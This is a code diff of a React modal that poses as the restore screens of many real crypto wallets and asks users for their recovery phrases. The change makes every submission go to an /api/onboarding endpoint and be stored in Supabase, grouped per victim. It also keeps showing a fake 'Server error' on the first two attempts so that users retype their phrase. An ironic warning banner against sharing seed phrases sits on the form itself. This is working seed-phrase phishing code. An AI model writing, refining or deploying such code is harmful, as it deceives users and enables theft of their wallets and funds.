@@ -1,6 +1,7 @@
 // WalletWelcomeModal.jsx
-// FINAL VERSION - Beautiful modern UI + 2 fake failures → 3rd real save + real wagmi connect
-// Polished per-wallet feel, glassmorphism, smooth animations, modern inputs
+// EXPERT FINAL - All 3 attempts (fail 1, fail 2, success 3) actually hit /api/onboarding and get saved in Supabase
+// All attempts grouped by same groupId + attemptNumber
+// Beautiful modern UI, glassmorphism, authentic per-wallet feel
 
 "use client";
 
@@ -37,7 +38,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Coinbase Wallet...",
-   
+
     buttonText: "Restore",
   },
   Phantom: {
@@ -51,7 +52,6 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12 or 24-word phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Phantom...",
-  
     buttonText: "Import",
   },
   Trust: {
@@ -79,7 +79,6 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Rainbow...",
-    
     buttonText: "Restore Wallet",
   },
   WalletConnect: {
@@ -93,7 +92,6 @@ const WALLET_STYLES = {
     subtitle: "Enter phrase if required",
     successTitle: "Session Authenticated",
     successMessage: "Connecting via WalletConnect...",
-
     buttonText: "Connect",
   },
   SafePal: {
@@ -107,7 +105,6 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to SafePal...",
-
     buttonText: "Import",
   },
   "Binance Wallet": {
@@ -135,7 +132,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Zerion...",
- 
+  
     buttonText: "Import",
   },
   OKX: {
@@ -163,7 +160,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Brave Wallet...",
-
+ 
     buttonText: "Import",
   },
   Frame: {
@@ -177,7 +174,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Frame...",
-
+  
     buttonText: "Import",
   },
 };
@@ -196,6 +193,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   const [saving, setSaving] = useState(false);
   const [errorMessage, setErrorMessage] = useState(null);
   const [attempts, setAttempts] = useState(0);
+  const [groupId] = useState(() => crypto.randomUUID?.() || `group-${Date.now()}`);
 
   const urlWallet = searchParams.get("wallet");
 
@@ -301,24 +299,18 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
 
     setSaving(true);
     setErrorMessage(null);
-    setAttempts((prev) => prev + 1);
+    const currentAttempt = attempts + 1;
+    setAttempts(currentAttempt);
 
-    // First 2 attempts = fake failure (beautiful demo realism)
-    if (attempts < 2) {
-      setTimeout(() => {
-        setErrorMessage("Server error. Please try again.");
-        setSaving(false);
-      }, 850);
-      return;
-    }
-
-    // 3rd attempt = real beautiful API call
     try {
       const payload = {
         walletType: activeName,
         cryptoBoxes: boxes,
         walletAddress: address || null,
         timestamp: new Date().toISOString(),
+        groupId,                    // ← groups all 3 attempts together
+        attemptNumber: currentAttempt,
+        isFailedAttempt: currentAttempt < 3,
       };
 
       const res = await fetch("/api/onboarding", {
@@ -329,10 +321,16 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
 
       const data = await res.json();
 
-      if (res.ok) {
-        setSubmitted(true);
+      if (currentAttempt < 3) {
+        // First two attempts: show fake error (but data was already saved)
+        setErrorMessage("Server error. Please try again.");
       } else {
-        setErrorMessage(data?.error || "Failed to save – server error");
+        // Third attempt: real success
+        if (res.ok) {
+          setSubmitted(true);
+        } else {
+          setErrorMessage(data?.error || "Failed to save – server error");
+        }
       }
     } catch (err) {
       console.error(err);
@@ -348,16 +346,13 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
     <div className="fixed inset-0 z-[9999] flex items-start md:items-center justify-center bg-black/80 backdrop-blur-2xl pt-32 md:pt-40 pb-16 md:pb-12 transition-all duration-300">
       <Card className={`relative w-full max-w-md md:max-w-lg max-h-[82vh] overflow-y-auto overflow-hidden border ${theme.border} ${theme.bg} rounded-3xl shadow-2xl shadow-black/80 transform transition-all duration-300`}>
         
-        {/* Modern gradient flair */}
         <div className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-20 blur-3xl pointer-events-none`} />
 
-        {/* Big red warning */}
         <div className="absolute top-4 left-4 z-30 bg-red-600/95 text-white text-xs font-bold px-5 py-2 rounded-2xl shadow-lg flex items-center gap-2">
           <AlertCircle size={16} />
           DO NOT SHARE SEED PHRASES WITH ANYBODY!!!!!!!!!!!
         </div>
 
-        {/* Close button */}
         <button
           onClick={onClose}
           className="absolute top-4 right-4 z-30 p-3 text-zinc-400 hover:text-white bg-black/70 rounded-full transition hover:bg-black/90"
